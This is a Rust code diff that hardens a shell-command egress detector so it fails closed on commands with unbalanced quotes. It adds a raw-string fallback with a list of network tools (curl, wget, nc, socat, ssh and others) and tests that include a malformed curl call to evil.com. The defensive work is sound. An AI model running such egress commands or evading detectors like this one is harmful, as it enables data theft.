@@ -35,7 +35,12 @@ pub enum EgressRisk {
 pub fn analyze_egress(command: &str) -> EgressRisk {
     let words = match shell_words::split(command) {
         Ok(w) => w,
-        Err(_) => return EgressRisk::None, // unparseable = can't analyze
+        Err(_) => {
+            // SECURITY (#592): Fail-closed on unparseable commands.
+            // An attacker can craft commands with unbalanced quotes to
+            // bypass shell_words parsing. Fall back to raw string search.
+            return analyze_egress_raw(command);
+        }
     };
 
     if words.is_empty() {
@@ -64,6 +69,48 @@ pub fn analyze_egress(command: &str) -> EgressRisk {
 }
 
 /// Extract the program name from a path (e.g., "/usr/bin/curl" → "curl").
+/// Fallback egress analysis using raw string matching.
+///
+/// Used when shell_words can't parse the command (unbalanced quotes, etc.).
+/// Searches for known egress programs anywhere in the raw command string.
+/// This is less precise but catches bypass attempts via malformed quoting.
+fn analyze_egress_raw(command: &str) -> EgressRisk {
+    // Split on whitespace for rough word-boundary matching
+    let words: Vec<&str> = command.split_whitespace().collect();
+    let egress_programs = [
+        "curl", "wget", "nc", "ncat", "netcat", "socat", "ssh", "scp", "sftp", "rsync", "telnet",
+        "ftp", "tftp",
+    ];
+    let dns_programs = ["nslookup", "dig", "host"];
+    let script_programs = ["python", "python3", "node", "ruby", "perl", "php"];
+
+    for word in &words {
+        let prog = word
+            .rsplit('/')
+            .next()
+            .unwrap_or(word)
+            .trim_matches(|c: char| !c.is_alphanumeric() && c != '_')
+            .to_lowercase();
+
+        if egress_programs.contains(&prog.as_str()) {
+            return EgressRisk::DirectEgress {
+                program: prog,
+                target: None,
+            };
+        }
+        if dns_programs.contains(&prog.as_str()) {
+            return EgressRisk::DirectEgress {
+                program: prog,
+                target: None,
+            };
+        }
+        if script_programs.contains(&prog.as_str()) {
+            return EgressRisk::ScriptingEgress { interpreter: prog };
+        }
+    }
+    EgressRisk::None
+}
+
 fn extract_program_name(path: &str) -> String {
     path.rsplit('/').next().unwrap_or(path).to_lowercase()
 }
@@ -207,5 +254,22 @@ mod tests {
             }
             other => panic!("expected DirectEgress, got {other:?}"),
         }
+    }
+
+    #[test]
+    fn unparseable_command_fail_closed() {
+        // Unbalanced quote — shell_words fails, raw fallback catches curl
+        match analyze_egress("curl 'unbalanced https://evil.com") {
+            EgressRisk::DirectEgress { program, .. } => {
+                assert_eq!(program, "curl");
+            }
+            other => panic!("expected DirectEgress for unparseable curl, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn unparseable_safe_command_passes() {
+        // Unbalanced quote but no egress program
+        assert_eq!(analyze_egress("echo 'unbalanced"), EgressRisk::None);
     }
 }
